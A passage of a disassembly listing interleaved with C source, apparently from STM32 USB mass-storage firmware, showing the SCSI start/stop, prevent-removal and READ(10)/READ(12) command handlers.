static int8_t SCSI_StartStopUnit(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a33c:	b580      	push	{r7, lr}
 800a33e:	b086      	sub	sp, #24
 800a340:	af00      	add	r7, sp, #0
 800a342:	60f8      	str	r0, [r7, #12]
 800a344:	460b      	mov	r3, r1
 800a346:	607a      	str	r2, [r7, #4]
 800a348:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a34a:	68fb      	ldr	r3, [r7, #12]
 800a34c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a350:	68fb      	ldr	r3, [r7, #12]
 800a352:	32b0      	adds	r2, #176	; 0xb0
 800a354:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a358:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a35a:	697b      	ldr	r3, [r7, #20]
 800a35c:	2b00      	cmp	r3, #0
 800a35e:	d102      	bne.n	800a366 <SCSI_StartStopUnit+0x2a>
  {
    return -1;
 800a360:	f04f 33ff 	mov.w	r3, #4294967295
 800a364:	e043      	b.n	800a3ee <SCSI_StartStopUnit+0xb2>
  }

  if ((hmsc->scsi_medium_state == SCSI_MEDIUM_LOCKED) && ((params[4] & 0x3U) == 2U))
 800a366:	697b      	ldr	r3, [r7, #20]
 800a368:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a36c:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a370:	2b01      	cmp	r3, #1
 800a372:	d10f      	bne.n	800a394 <SCSI_StartStopUnit+0x58>
 800a374:	687b      	ldr	r3, [r7, #4]
 800a376:	3304      	adds	r3, #4
 800a378:	781b      	ldrb	r3, [r3, #0]
 800a37a:	f003 0303 	and.w	r3, r3, #3
 800a37e:	2b02      	cmp	r3, #2
 800a380:	d108      	bne.n	800a394 <SCSI_StartStopUnit+0x58>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_FIELED_IN_COMMAND);
 800a382:	7af9      	ldrb	r1, [r7, #11]
 800a384:	2324      	movs	r3, #36	; 0x24
 800a386:	2205      	movs	r2, #5
 800a388:	68f8      	ldr	r0, [r7, #12]
 800a38a:	f7ff ff7b 	bl	800a284 <SCSI_SenseCode>

    return -1;
 800a38e:	f04f 33ff 	mov.w	r3, #4294967295
 800a392:	e02c      	b.n	800a3ee <SCSI_StartStopUnit+0xb2>
  }

  if ((params[4] & 0x3U) == 0x1U) /* START=1 */
 800a394:	687b      	ldr	r3, [r7, #4]
 800a396:	3304      	adds	r3, #4
 800a398:	781b      	ldrb	r3, [r3, #0]
 800a39a:	f003 0303 	and.w	r3, r3, #3
 800a39e:	2b01      	cmp	r3, #1
 800a3a0:	d106      	bne.n	800a3b0 <SCSI_StartStopUnit+0x74>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a3a2:	697b      	ldr	r3, [r7, #20]
 800a3a4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3a8:	2200      	movs	r2, #0
 800a3aa:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a3ae:	e01a      	b.n	800a3e6 <SCSI_StartStopUnit+0xaa>
  }
  else if ((params[4] & 0x3U) == 0x2U) /* START=0 and LOEJ Load Eject=1 */
 800a3b0:	687b      	ldr	r3, [r7, #4]
 800a3b2:	3304      	adds	r3, #4
 800a3b4:	781b      	ldrb	r3, [r3, #0]
 800a3b6:	f003 0303 	and.w	r3, r3, #3
 800a3ba:	2b02      	cmp	r3, #2
 800a3bc:	d106      	bne.n	800a3cc <SCSI_StartStopUnit+0x90>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_EJECTED;
 800a3be:	697b      	ldr	r3, [r7, #20]
 800a3c0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3c4:	2202      	movs	r2, #2
 800a3c6:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a3ca:	e00c      	b.n	800a3e6 <SCSI_StartStopUnit+0xaa>
  }
  else if ((params[4] & 0x3U) == 0x3U) /* START=1 and LOEJ Load Eject=1 */
 800a3cc:	687b      	ldr	r3, [r7, #4]
 800a3ce:	3304      	adds	r3, #4
 800a3d0:	781b      	ldrb	r3, [r3, #0]
 800a3d2:	f003 0303 	and.w	r3, r3, #3
 800a3d6:	2b03      	cmp	r3, #3
 800a3d8:	d105      	bne.n	800a3e6 <SCSI_StartStopUnit+0xaa>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a3da:	697b      	ldr	r3, [r7, #20]
 800a3dc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3e0:	2200      	movs	r2, #0
 800a3e2:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
  }
  else
  {
    /* .. */
  }
  hmsc->bot_data_length = 0U;
 800a3e6:	697b      	ldr	r3, [r7, #20]
 800a3e8:	2200      	movs	r2, #0
 800a3ea:	60da      	str	r2, [r3, #12]

  return 0;
 800a3ec:	2300      	movs	r3, #0
}
 800a3ee:	4618      	mov	r0, r3
 800a3f0:	3718      	adds	r7, #24
 800a3f2:	46bd      	mov	sp, r7
 800a3f4:	bd80      	pop	{r7, pc}

0800a3f6 <SCSI_AllowPreventRemovable>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_AllowPreventRemovable(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a3f6:	b480      	push	{r7}
 800a3f8:	b087      	sub	sp, #28
 800a3fa:	af00      	add	r7, sp, #0
 800a3fc:	60f8      	str	r0, [r7, #12]
 800a3fe:	460b      	mov	r3, r1
 800a400:	607a      	str	r2, [r7, #4]
 800a402:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a404:	68fb      	ldr	r3, [r7, #12]
 800a406:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a40a:	68fb      	ldr	r3, [r7, #12]
 800a40c:	32b0      	adds	r2, #176	; 0xb0
 800a40e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a412:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a414:	697b      	ldr	r3, [r7, #20]
 800a416:	2b00      	cmp	r3, #0
 800a418:	d102      	bne.n	800a420 <SCSI_AllowPreventRemovable+0x2a>
  {
    return -1;
 800a41a:	f04f 33ff 	mov.w	r3, #4294967295
 800a41e:	e015      	b.n	800a44c <SCSI_AllowPreventRemovable+0x56>
  }

  if (params[4] == 0U)
 800a420:	687b      	ldr	r3, [r7, #4]
 800a422:	3304      	adds	r3, #4
 800a424:	781b      	ldrb	r3, [r3, #0]
 800a426:	2b00      	cmp	r3, #0
 800a428:	d106      	bne.n	800a438 <SCSI_AllowPreventRemovable+0x42>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a42a:	697b      	ldr	r3, [r7, #20]
 800a42c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a430:	2200      	movs	r2, #0
 800a432:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a436:	e005      	b.n	800a444 <SCSI_AllowPreventRemovable+0x4e>
  }
  else
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_LOCKED;
 800a438:	697b      	ldr	r3, [r7, #20]
 800a43a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a43e:	2201      	movs	r2, #1
 800a440:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
  }

  hmsc->bot_data_length = 0U;
 800a444:	697b      	ldr	r3, [r7, #20]
 800a446:	2200      	movs	r2, #0
 800a448:	60da      	str	r2, [r3, #12]

  return 0;
 800a44a:	2300      	movs	r3, #0
}
 800a44c:	4618      	mov	r0, r3
 800a44e:	371c      	adds	r7, #28
 800a450:	46bd      	mov	sp, r7
 800a452:	f85d 7b04 	ldr.w	r7, [sp], #4
 800a456:	4770      	bx	lr

0800a458 <SCSI_Read10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Read10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a458:	b580      	push	{r7, lr}
 800a45a:	b086      	sub	sp, #24
 800a45c:	af00      	add	r7, sp, #0
 800a45e:	60f8      	str	r0, [r7, #12]
 800a460:	460b      	mov	r3, r1
 800a462:	607a      	str	r2, [r7, #4]
 800a464:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a466:	68fb      	ldr	r3, [r7, #12]
 800a468:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a46c:	68fb      	ldr	r3, [r7, #12]
 800a46e:	32b0      	adds	r2, #176	; 0xb0
 800a470:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a474:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a476:	697b      	ldr	r3, [r7, #20]
 800a478:	2b00      	cmp	r3, #0
 800a47a:	d102      	bne.n	800a482 <SCSI_Read10+0x2a>
  {
    return -1;
 800a47c:	f04f 33ff 	mov.w	r3, #4294967295
 800a480:	e09d      	b.n	800a5be <SCSI_Read10+0x166>
  }

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a482:	697b      	ldr	r3, [r7, #20]
 800a484:	7a1b      	ldrb	r3, [r3, #8]
 800a486:	2b00      	cmp	r3, #0
 800a488:	f040 808f 	bne.w	800a5aa <SCSI_Read10+0x152>
  {
    /* case 10 : Ho <> Di */
    if ((hmsc->cbw.bmFlags & 0x80U) != 0x80U)
 800a48c:	697b      	ldr	r3, [r7, #20]
 800a48e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a492:	7f1b      	ldrb	r3, [r3, #28]
 800a494:	b25b      	sxtb	r3, r3
 800a496:	2b00      	cmp	r3, #0
 800a498:	db0b      	blt.n	800a4b2 <SCSI_Read10+0x5a>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a49a:	697b      	ldr	r3, [r7, #20]
 800a49c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4a0:	7f59      	ldrb	r1, [r3, #29]
 800a4a2:	2320      	movs	r3, #32
 800a4a4:	2205      	movs	r2, #5
 800a4a6:	68f8      	ldr	r0, [r7, #12]
 800a4a8:	f7ff feec 	bl	800a284 <SCSI_SenseCode>
      return -1;
 800a4ac:	f04f 33ff 	mov.w	r3, #4294967295
 800a4b0:	e085      	b.n	800a5be <SCSI_Read10+0x166>
    }

    if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 800a4b2:	697b      	ldr	r3, [r7, #20]
 800a4b4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4b8:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a4bc:	2b02      	cmp	r3, #2
 800a4be:	d108      	bne.n	800a4d2 <SCSI_Read10+0x7a>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a4c0:	7af9      	ldrb	r1, [r7, #11]
 800a4c2:	233a      	movs	r3, #58	; 0x3a
 800a4c4:	2202      	movs	r2, #2
 800a4c6:	68f8      	ldr	r0, [r7, #12]
 800a4c8:	f7ff fedc 	bl	800a284 <SCSI_SenseCode>

      return -1;
 800a4cc:	f04f 33ff 	mov.w	r3, #4294967295
 800a4d0:	e075      	b.n	800a5be <SCSI_Read10+0x166>
    }

    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a4d2:	68fb      	ldr	r3, [r7, #12]
 800a4d4:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a4d8:	68fa      	ldr	r2, [r7, #12]
 800a4da:	33b0      	adds	r3, #176	; 0xb0
 800a4dc:	009b      	lsls	r3, r3, #2
 800a4de:	4413      	add	r3, r2
 800a4e0:	685b      	ldr	r3, [r3, #4]
 800a4e2:	689b      	ldr	r3, [r3, #8]
 800a4e4:	7afa      	ldrb	r2, [r7, #11]
 800a4e6:	4610      	mov	r0, r2
 800a4e8:	4798      	blx	r3
 800a4ea:	4603      	mov	r3, r0
 800a4ec:	2b00      	cmp	r3, #0
 800a4ee:	d008      	beq.n	800a502 <SCSI_Read10+0xaa>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a4f0:	7af9      	ldrb	r1, [r7, #11]
 800a4f2:	233a      	movs	r3, #58	; 0x3a
 800a4f4:	2202      	movs	r2, #2
 800a4f6:	68f8      	ldr	r0, [r7, #12]
 800a4f8:	f7ff fec4 	bl	800a284 <SCSI_SenseCode>
      return -1;
 800a4fc:	f04f 33ff 	mov.w	r3, #4294967295
 800a500:	e05d      	b.n	800a5be <SCSI_Read10+0x166>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a502:	687b      	ldr	r3, [r7, #4]
 800a504:	3302      	adds	r3, #2
 800a506:	781b      	ldrb	r3, [r3, #0]
 800a508:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a50a:	687b      	ldr	r3, [r7, #4]
 800a50c:	3303      	adds	r3, #3
 800a50e:	781b      	ldrb	r3, [r3, #0]
 800a510:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a512:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] <<  8) |
 800a514:	687b      	ldr	r3, [r7, #4]
 800a516:	3304      	adds	r3, #4
 800a518:	781b      	ldrb	r3, [r3, #0]
 800a51a:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a51c:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a51e:	687a      	ldr	r2, [r7, #4]
 800a520:	3205      	adds	r2, #5
 800a522:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] <<  8) |
 800a524:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a526:	697a      	ldr	r2, [r7, #20]
 800a528:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a52c:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[7] <<  8) | (uint32_t)params[8];
 800a52e:	687b      	ldr	r3, [r7, #4]
 800a530:	3307      	adds	r3, #7
 800a532:	781b      	ldrb	r3, [r3, #0]
 800a534:	021b      	lsls	r3, r3, #8
 800a536:	687a      	ldr	r2, [r7, #4]
 800a538:	3208      	adds	r2, #8
 800a53a:	7812      	ldrb	r2, [r2, #0]
 800a53c:	4313      	orrs	r3, r2
 800a53e:	697a      	ldr	r2, [r7, #20]
 800a540:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a544:	6713      	str	r3, [r2, #112]	; 0x70

    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a546:	697b      	ldr	r3, [r7, #20]
 800a548:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a54c:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a54e:	697b      	ldr	r3, [r7, #20]
 800a550:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a554:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a556:	7af9      	ldrb	r1, [r7, #11]
 800a558:	68f8      	ldr	r0, [r7, #12]
 800a55a:	f000 fb0c 	bl	800ab76 <SCSI_CheckAddressRange>
 800a55e:	4603      	mov	r3, r0
 800a560:	2b00      	cmp	r3, #0
 800a562:	da02      	bge.n	800a56a <SCSI_Read10+0x112>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a564:	f04f 33ff 	mov.w	r3, #4294967295
 800a568:	e029      	b.n	800a5be <SCSI_Read10+0x166>
    }

    /* cases 4,5 : Hi <> Dn */
    if (hmsc->cbw.dDataLength != (hmsc->scsi_blk_len * hmsc->scsi_blk_size))
 800a56a:	697b      	ldr	r3, [r7, #20]
 800a56c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a570:	699a      	ldr	r2, [r3, #24]
 800a572:	697b      	ldr	r3, [r7, #20]
 800a574:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a578:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a57a:	6979      	ldr	r1, [r7, #20]
 800a57c:	f501 5180 	add.w	r1, r1, #4096	; 0x1000
 800a580:	f8b1 1064 	ldrh.w	r1, [r1, #100]	; 0x64
 800a584:	fb01 f303 	mul.w	r3, r1, r3
 800a588:	429a      	cmp	r2, r3
 800a58a:	d00b      	beq.n	800a5a4 <SCSI_Read10+0x14c>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a58c:	697b      	ldr	r3, [r7, #20]
 800a58e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a592:	7f59      	ldrb	r1, [r3, #29]
 800a594:	2320      	movs	r3, #32
 800a596:	2205      	movs	r2, #5
 800a598:	68f8      	ldr	r0, [r7, #12]
 800a59a:	f7ff fe73 	bl	800a284 <SCSI_SenseCode>
      return -1;
 800a59e:	f04f 33ff 	mov.w	r3, #4294967295
 800a5a2:	e00c      	b.n	800a5be <SCSI_Read10+0x166>
    }

    hmsc->bot_state = USBD_BOT_DATA_IN;
 800a5a4:	697b      	ldr	r3, [r7, #20]
 800a5a6:	2202      	movs	r2, #2
 800a5a8:	721a      	strb	r2, [r3, #8]
  }
  hmsc->bot_data_length = MSC_MEDIA_PACKET;
 800a5aa:	697b      	ldr	r3, [r7, #20]
 800a5ac:	f44f 5280 	mov.w	r2, #4096	; 0x1000
 800a5b0:	60da      	str	r2, [r3, #12]

  return SCSI_ProcessRead(pdev, lun);
 800a5b2:	7afb      	ldrb	r3, [r7, #11]
 800a5b4:	4619      	mov	r1, r3
 800a5b6:	68f8      	ldr	r0, [r7, #12]
 800a5b8:	f000 fb0a 	bl	800abd0 <SCSI_ProcessRead>
 800a5bc:	4603      	mov	r3, r0
}
 800a5be:	4618      	mov	r0, r3
 800a5c0:	3718      	adds	r7, #24
 800a5c2:	46bd      	mov	sp, r7
 800a5c4:	bd80      	pop	{r7, pc}

0800a5c6 <SCSI_Read12>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Read12(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a5c6:	b580      	push	{r7, lr}
 800a5c8:	b086      	sub	sp, #24
 800a5ca:	af00      	add	r7, sp, #0
 800a5cc:	60f8      	str	r0, [r7, #12]
 800a5ce:	460b      	mov	r3, r1
 800a5d0:	607a      	str	r2, [r7, #4]
 800a5d2:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a5d4:	68fb      	ldr	r3, [r7, #12]
 800a5d6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a5da:	68fb      	ldr	r3, [r7, #12]
 800a5dc:	32b0      	adds	r2, #176	; 0xb0
 800a5de:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a5e2:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a5e4:	697b      	ldr	r3, [r7, #20]
 800a5e6:	2b00      	cmp	r3, #0
 800a5e8:	d102      	bne.n	800a5f0 <SCSI_Read12+0x2a>
  {
    return -1;
 800a5ea:	f04f 33ff 	mov.w	r3, #4294967295
 800a5ee:	e0a7      	b.n	800a740 <SCSI_Read12+0x17a>
  }

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a5f0:	697b      	ldr	r3, [r7, #20]
 800a5f2:	7a1b      	ldrb	r3, [r3, #8]
 800a5f4:	2b00      	cmp	r3, #0
 800a5f6:	f040 8099 	bne.w	800a72c <SCSI_Read12+0x166>
  {
    /* case 10 : Ho <> Di */
    if ((hmsc->cbw.bmFlags & 0x80U) != 0x80U)
 800a5fa:	697b      	ldr	r3, [r7, #20]
 800a5fc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a600:	7f1b      	ldrb	r3, [r3, #28]
 800a602:	b25b      	sxtb	r3, r3
 800a604:	2b00      	cmp	r3, #0
 800a606:	db0b      	blt.n	800a620 <SCSI_Read12+0x5a>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a608:	697b      	ldr	r3, [r7, #20]
 800a60a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a60e:	7f59      	ldrb	r1, [r3, #29]
 800a610:	2320      	movs	r3, #32
 800a612:	2205      	movs	r2, #5
 800a614:	68f8      	ldr	r0, [r7, #12]
 800a616:	f7ff fe35 	bl	800a284 <SCSI_SenseCode>
      return -1;
 800a61a:	f04f 33ff 	mov.w	r3, #4294967295
 800a61e:	e08f      	b.n	800a740 <SCSI_Read12+0x17a>
    }

    if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 800a620:	697b      	ldr	r3, [r7, #20]
 800a622:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a626:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a62a:	2b02      	cmp	r3, #2
 800a62c:	d108      	bne.n	800a640 <SCSI_Read12+0x7a>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a62e:	7af9      	ldrb	r1, [r7, #11]
 800a630:	233a      	movs	r3, #58	; 0x3a
 800a632:	2202      	movs	r2, #2
 800a634:	68f8      	ldr	r0, [r7, #12]
 800a636:	f7ff fe25 	bl	800a284 <SCSI_SenseCode>
      return -1;
 800a63a:	f04f 33ff 	mov.w	r3, #4294967295
 800a63e:	e07f      	b.n	800a740 <SCSI_Read12+0x17a>
    }

    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a640:	68fb      	ldr	r3, [r7, #12]
 800a642:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a646:	68fa      	ldr	r2, [r7, #12]
 800a648:	33b0      	adds	r3, #176	; 0xb0
 800a64a:	009b      	lsls	r3, r3, #2
 800a64c:	4413      	add	r3, r2
 800a64e:	685b      	ldr	r3, [r3, #4]
 800a650:	689b      	ldr	r3, [r3, #8]
 800a652:	7afa      	ldrb	r2, [r7, #11]
 800a654:	4610      	mov	r0, r2
 800a656:	4798      	blx	r3
 800a658:	4603      	mov	r3, r0
 800a65a:	2b00      	cmp	r3, #0
 800a65c:	d008      	beq.n	800a670 <SCSI_Read12+0xaa>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a65e:	7af9      	ldrb	r1, [r7, #11]
 800a660:	233a      	movs	r3, #58	; 0x3a
 800a662:	2202      	movs	r2, #2
 800a664:	68f8      	ldr	r0, [r7, #12]
 800a666:	f7ff fe0d 	bl	800a284 <SCSI_SenseCode>
      return -1;
 800a66a:	f04f 33ff 	mov.w	r3, #4294967295
 800a66e:	e067      	b.n	800a740 <SCSI_Read12+0x17a>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a670:	687b      	ldr	r3, [r7, #4]
 800a672:	3302      	adds	r3, #2
 800a674:	781b      	ldrb	r3, [r3, #0]
 800a676:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a678:	687b      	ldr	r3, [r7, #4]
 800a67a:	3303      	adds	r3, #3
 800a67c:	781b      	ldrb	r3, [r3, #0]
 800a67e:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a680:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] <<  8) |
 800a682:	687b      	ldr	r3, [r7, #4]
 800a684:	3304      	adds	r3, #4
 800a686:	781b      	ldrb	r3, [r3, #0]
 800a688:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a68a:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a68c:	687a      	ldr	r2, [r7, #4]
 800a68e:	3205      	adds	r2, #5
 800a690:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] <<  8) |
 800a692:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a694:	697a      	ldr	r2, [r7, #20]
 800a696:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a69a:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a69c:	687b      	ldr	r3, [r7, #4]
 800a69e:	3306      	adds	r3, #6
 800a6a0:	781b      	ldrb	r3, [r3, #0]
 800a6a2:	061a      	lsls	r2, r3, #24
                         ((uint32_t)params[7] << 16) |
 800a6a4:	687b      	ldr	r3, [r7, #4]
 800a6a6:	3307      	adds	r3, #7
 800a6a8:	781b      	ldrb	r3, [r3, #0]
 800a6aa:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a6ac:	431a      	orrs	r2, r3
                         ((uint32_t)params[8] << 8) |
 800a6ae:	687b      	ldr	r3, [r7, #4]
 800a6b0:	3308      	adds	r3, #8
 800a6b2:	781b      	ldrb	r3, [r3, #0]
 800a6b4:	021b      	lsls	r3, r3, #8
                         ((uint32_t)params[7] << 16) |
 800a6b6:	4313      	orrs	r3, r2
                         (uint32_t)params[9];
 800a6b8:	687a      	ldr	r2, [r7, #4]
 800a6ba:	3209      	adds	r2, #9
 800a6bc:	7812      	ldrb	r2, [r2, #0]
                         ((uint32_t)params[8] << 8) |
 800a6be:	4313      	orrs	r3, r2
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a6c0:	697a      	ldr	r2, [r7, #20]
 800a6c2:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a6c6:	6713      	str	r3, [r2, #112]	; 0x70

    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a6c8:	697b      	ldr	r3, [r7, #20]
 800a6ca:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6ce:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a6d0:	697b      	ldr	r3, [r7, #20]
 800a6d2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6d6:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a6d8:	7af9      	ldrb	r1, [r7, #11]
 800a6da:	68f8      	ldr	r0, [r7, #12]
 800a6dc:	f000 fa4b 	bl	800ab76 <SCSI_CheckAddressRange>
 800a6e0:	4603      	mov	r3, r0
 800a6e2:	2b00      	cmp	r3, #0
 800a6e4:	da02      	bge.n	800a6ec <SCSI_Read12+0x126>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a6e6:	f04f 33ff 	mov.w	r3, #4294967295
 800a6ea:	e029      	b.n	800a740 <SCSI_Read12+0x17a>
    }

    /* cases 4,5 : Hi <> Dn */
    if (hmsc->cbw.dDataLength != (hmsc->scsi_blk_len * hmsc->scsi_blk_size))
 800a6ec:	697b      	ldr	r3, [r7, #20]
 800a6ee:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6f2:	699a      	ldr	r2, [r3, #24]
 800a6f4:	697b      	ldr	r3, [r7, #20]
 800a6f6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6fa:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a6fc:	6979      	ldr	r1, [r7, #20]
 800a6fe:	f501 5180 	add.w	r1, r1, #4096	; 0x1000
 800a702:	f8b1 1064 	ldrh.w	r1, [r1, #100]	; 0x64
 800a706:	fb01 f303 	mul.w	r3, r1, r3
 800a70a:	429a      	cmp	r2, r3
 800a70c:	d00b      	beq.n	800a726 <SCSI_Read12+0x160>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a70e:	697b      	ldr	r3, [r7, #20]
 800a710:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a714:	7f59      	ldrb	r1, [r3, #29]
 800a716:	2320      	movs	r3, #32
 800a718:	2205      	movs	r2, #5
 800a71a:	68f8      	ldr	r0, [r7, #12]
 800a71c:	f7ff fdb2 	bl	800a284 <SCSI_SenseCode>
      return -1;
 800a720:	f04f 33ff 	mov.w	r3, #4294967295
 800a724:	e00c      	b.n	800a740 <SCSI_Read12+0x17a>
    }

    hmsc->bot_state = USBD_BOT_DATA_IN;
 800a726:	697b      	ldr	r3, [r7, #20]
 800a728:	2202      	movs	r2, #2
 800a72a:	721a      	strb	r2, [r3, #8]
  }
  hmsc->bot_data_length = MSC_MEDIA_PACKET;
 800a72c:	697b      	ldr	r3, [r7, #20]
 800a72e:	f44f 5280 	mov.w	r2, #4096	; 0x1000
 800a732:	60da      	str	r2, [r3, #12]

  return SCSI_ProcessRead(pdev, lun);
 800a734:	7afb      	ldrb	r3, [r7, #11]
 800a736:	4619      	mov	r1, r3
 800a738:	68f8      	ldr	r0, [r7, #12]
 800a73a:	f000 fa49 	bl	800abd0 <SCSI_ProcessRead>
